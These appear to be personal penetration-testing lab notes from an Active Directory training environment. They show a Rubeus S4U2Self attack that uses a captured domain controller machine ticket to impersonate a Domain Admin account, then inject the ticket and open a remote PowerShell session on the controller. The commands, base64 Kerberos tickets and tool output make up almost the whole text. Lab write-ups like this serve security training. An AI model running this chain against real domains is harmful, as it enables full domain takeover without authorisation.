#### Theory can be found in [[2. Domain Privilege Escalation#7. S4U2Self]] ####

- After we coerce `DCORP-DC` to authenticate to `DCORP-APPSRV` and capture the TGT of `DCORP-DC$` we can request a usable TGS as `dcorp\svcadmin` who is a DA.
```
PS C:\AD\MyTools> .\Rubeus.exe s4u /self /user:dcorp-dc$ /impersonateuser:svcadmin /altservice:http/dcorp-dc.dollarcorp.moneycorp.local /ticket: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 /nowrap

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.3

[*] Action: S4U

[*] Action: S4U

[*] Building S4U2self request for: 'DCORP-DC$@DOLLARCORP.MONEYCORP.LOCAL'
[*] Using domain controller: dcorp-dc.dollarcorp.moneycorp.local (172.16.2.1)
[*] Sending S4U2self request to 172.16.2.1:88
[+] S4U2self success!
[*] Substituting alternative service name 'http/dcorp-dc.dollarcorp.moneycorp.local'
[*] Got a TGS for 'svcadmin' to 'http@DOLLARCORP.MONEYCORP.LOCAL'
[*] base64(ticket.kirbi):

      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

PS C:\AD\MyTools> .\Rubeus.exe ptt /ticket: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

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.3


[*] Action: Import Ticket
[+] Ticket successfully imported!
PS C:\AD\MyTools> klist

Current LogonId is 0:0x14a71888

Cached Tickets: (1)

#0>     Client: svcadmin @ DOLLARCORP.MONEYCORP.LOCAL
        Server: http/dcorp-dc.dollarcorp.moneycorp.local @ DOLLARCORP.MONEYCORP.LOCAL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x60a50000 -> forwardable forwarded renewable pre_authent ok_as_delegate name_canonicalize
        Start Time: 8/24/2023 0:18:00 (local)
        End Time:   8/24/2023 7:01:45 (local)
        Renew Time: 8/30/2023 21:01:45 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0
        Kdc Called:

PS C:\AD\MyTools> Enter-PSSession -ComputerName dcorp-dc.dollarcorp.moneycorp.local
[dcorp-dc.dollarcorp.moneycorp.local]: PS C:\Users\svcadmin\Documents> whoami
dcorp\svcadmin
[dcorp-dc.dollarcorp.moneycorp.local]: PS C:\Users\svcadmin\Documents> hostname
dcorp-dc
```